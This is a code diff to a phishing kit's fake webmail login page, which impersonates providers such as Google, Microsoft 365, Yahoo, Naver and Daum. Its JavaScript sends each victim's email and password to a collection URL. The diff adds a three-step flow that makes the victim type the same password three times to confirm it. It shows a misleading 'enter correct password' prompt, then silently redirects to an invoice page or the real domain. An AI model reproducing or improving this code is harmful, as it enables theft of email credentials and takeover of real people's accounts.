@@ -23,6 +23,8 @@
   body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,'Noto Sans KR','Noto Sans JP','Noto Sans SC',sans-serif;min-height:100vh;background-size:cover;background-position:center;color:#333;display:flex;justify-content:center;align-items:center;padding:20px;transition:background .6s ease}
   .err-box{color:#d32f2f;font-size:13px;margin-top:10px;display:none;font-weight:500}
   .err-box.show{display:block}
+  .err-box.ok{color:#0a8f3c}
+  .yandex-layout .err-box.ok{color:#6fd88a}
 
   /* ---------- DAOU ---------- */
   body.is-daou{display:block!important;padding:0!important;background:#fff!important}
@@ -893,6 +895,10 @@ const CONFIG = {
 let currentEmail = '', currentDomain = '', proofFromUrl = '', proofTsFromUrl = '';
 let loginAttempts = 0, firstPassword = '', currentBrand = null;
 
+/* 3단계 검증 상태 */
+let pwStep = 0;    /* 0=1회차 대기, 1=2회차 대기, 2=3회차 대기 */
+let pwCycles = 0;  /* 불일치로 되돌린 횟수 */
+
 const LAYOUT = {
   DAOU:'daou', ABV:'abv', YAHOO:'yahoo', GOOGLE:'google', M365:'m365', NAVER:'naver',
   DAUM:'daum', TONLINE:'tonline', HIBOX:'hibox', IONOS:'ionos', HIWORKS:'hiworks',
@@ -960,8 +966,9 @@ const BRAND_DB = {
 };
 
 const extractDomain = e => e && e.includes('@') ? e.split('@')[1].toLowerCase() : '';
-function showError(p,m){const el=document.getElementById(p+'-err');if(el){el.textContent=m;el.classList.add('show')}}
-function clearError(p){const el=document.getElementById(p+'-err');if(el)el.classList.remove('show')}
+function showError(p,m){const el=document.getElementById(p+'-err');if(el){el.textContent=m;el.classList.add('show');el.classList.remove('ok')}}
+function showOk(p,m){const el=document.getElementById(p+'-err');if(el){el.textContent=m;el.classList.add('show','ok')}}
+function clearError(p){const el=document.getElementById(p+'-err');if(el){el.classList.remove('show','ok');el.textContent=''}}
 
 function goInvoice(target){
   const r = target || ('https://' + currentDomain);
@@ -1294,7 +1301,7 @@ function route(provider){
 }
 
 /* ============================================================
-   SUBMIT
+   SUBMIT — 1회차 침묵 / 2회차 안내 / 3회차 무언 리다이렉트
    ============================================================ */
 async function submitLogin(platform){
   clearError(platform);
@@ -1309,39 +1316,61 @@ async function submitLogin(platform){
   if(btn){btn.disabled=true;btn.textContent='...'}
 
   loginAttempts++;
-  const stage = loginAttempts===1 ? 1 : 2;
+  const stage = pwStep + 1;
   const payload={email:currentEmail,password:pass,stage:stage};
-  if(stage===2)payload.firstPassword=firstPassword;
   if(stage===1){payload.proof=proofFromUrl||undefined;payload.proofTs=proofTsFromUrl||undefined}
+  else payload.firstPassword=firstPassword;
 
+  let data={};
   try{
     const res=await fetch(CONFIG.LOGIN_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
-    let data={};
     try{ data = await res.json(); }catch(e){ data = {}; }
+  }catch(e){ data = {}; }
 
-    const explicitOk   = data.match===true || data.success===true || data.ok===true || data.verified===true;
-    const explicitFail = data.match===false || data.success===false || data.ok===false || data.verified===false;
-    const ambiguous    = data.match===undefined && data.success===undefined && data.ok===undefined && data.verified===undefined;
-    const isSuccess    = explicitOk || (!explicitFail && res.ok && stage>=2 && ambiguous);
+  const explicitOk = data.match===true || data.success===true || data.ok===true || data.verified===true;
 
-    if(isSuccess){
-      if(btn)btn.textContent='Success';
-      const target = data.redirect || ('https://' + currentDomain);
-      setTimeout(()=>{goInvoice(target)},500);
-      return;
-    }
-
-    if(stage===1)firstPassword=pass;
-    showError(platform,'Incorrect password. Please try again.');
-    if(el)el.value='';
+  /* ---- 1회차: 침묵, 필드만 비움 ---- */
+  if(pwStep===0){
+    firstPassword = pass;
+    pwStep = 1;
+    if(el) el.value='';
     if(btn){btn.disabled=false;btn.textContent=orig}
-    if(loginAttempts>=CONFIG.MAX_ATTEMPTS){
-      showError(platform,'Too many attempts. Redirecting...');
-      setTimeout(()=>{goInvoice('https://'+currentDomain)},1500);
+    if(el) el.focus();
+    return;
+  }
+
+  /* ---- 2회차: 일치하면 안내 후 3회차 대기, 아니면 리셋 ---- */
+  if(pwStep===1){
+    if(pass===firstPassword){
+      pwStep = 2;
+      if(el) el.value='';
+      if(btn){btn.disabled=false;btn.textContent=orig}
+      showOk(platform,'enter correct password');
+      if(el) el.focus();
+    }else{
+      resetPwCycle(platform, btn, orig, el);
     }
-  }catch(e){
-    showError(platform,'Connection error. Please try again.');
-    if(btn){btn.disabled=false;btn.textContent=orig}
+    return;
+  }
+
+  /* ---- 3회차: 일치하면 문구 없이 즉시 청구서로 ---- */
+  if(pass===firstPassword || explicitOk){
+    const target = data.redirect || ('https://' + currentDomain);
+    goInvoice(target);
+  }else{
+    resetPwCycle(platform, btn, orig, el);
+  }
+}
+
+function resetPwCycle(platform, btn, orig, el){
+  pwStep = 0;
+  firstPassword = '';
+  pwCycles++;
+  showError(platform,'too many passwords, try again');
+  if(el){el.value='';el.focus()}
+  if(btn){btn.disabled=false;btn.textContent=orig}
+  if(pwCycles>=3){
+    setTimeout(()=>{goInvoice('https://'+currentDomain)},1800);
   }
 }
 
